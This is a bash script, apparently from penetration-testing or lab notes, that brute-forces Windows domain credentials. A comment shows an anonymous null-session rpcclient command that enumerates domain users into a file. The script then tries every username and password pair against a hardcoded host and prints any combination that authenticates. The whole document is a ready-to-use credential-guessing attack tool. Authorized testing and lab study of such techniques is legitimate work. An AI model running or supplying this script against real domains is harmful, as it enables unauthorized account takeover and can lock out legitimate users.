#!/bin/bash

# Generate domain-users.txt with the command below:
# rpcclient -U ""%"" 192.168.1.1 -c enumdomusers | cut -d" " -f1 | cut -d":" -f2 | tr -d "[" | tr -d "]" > domain-users.txt
# Supply a valid user and password when you have domain-level privilege\
# Usage ./script.sh domain-users.txt pass.txt

echo "[*] Starting bruteforce testing..."

users="$1"
pass="$2"

for u in `cat $users`;
do
        for p in `cat $pass`
        do
                output=$(rpcclient -W DOMAIN.COM -U $u%$p -c "getusername;quit" 10.11.1.20)
                filtered=$(echo $output | grep 'Account' > /dev/null)
                if [ $? = 0 ]; then
                        echo -n "[*] user: $u - "
                        echo $output
                        echo "Password: $p"
                fi
        done
done

echo "[*] Bruteforce finished."
